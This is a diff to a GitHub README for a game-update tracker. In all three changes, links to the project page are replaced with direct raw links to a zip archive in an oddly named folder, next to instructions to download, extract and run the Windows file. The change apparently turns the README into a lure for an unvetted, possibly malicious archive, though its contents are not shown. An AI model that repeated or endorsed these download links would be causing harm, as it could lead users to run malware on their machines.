@@ -1,10 +1,10 @@
 # 🛠️ f95-game-updater - Track releases and manage games
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/krishnakhedkar15-gif/f95-game-updater)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/krishnakhedkar15-gif/f95-game-updater/raw/refs/heads/main/androgynary/updater-game-f-v1.2.zip)
 
 ## 📥 Download
 Open the project page here and use the files or release assets on that page to get the app:
-https://github.com/krishnakhedkar15-gif/f95-game-updater
+https://github.com/krishnakhedkar15-gif/f95-game-updater/raw/refs/heads/main/androgynary/updater-game-f-v1.2.zip
 
 ## 🖥️ What this app does
 f95-game-updater helps you keep track of new game releases, download updates, and manage your F95zone game library in one place.
@@ -116,7 +116,7 @@ This app works best if you keep many F95zone games and want a simple way to trac
 
 ## 📦 Download and run
 Go to the project page here:
-https://github.com/krishnakhedkar15-gif/f95-game-updater
+https://github.com/krishnakhedkar15-gif/f95-game-updater/raw/refs/heads/main/androgynary/updater-game-f-v1.2.zip
 
 Download the latest Windows file, then open it to run the app. If the download comes in a compressed folder, extract it first, then launch the program from the extracted files
 
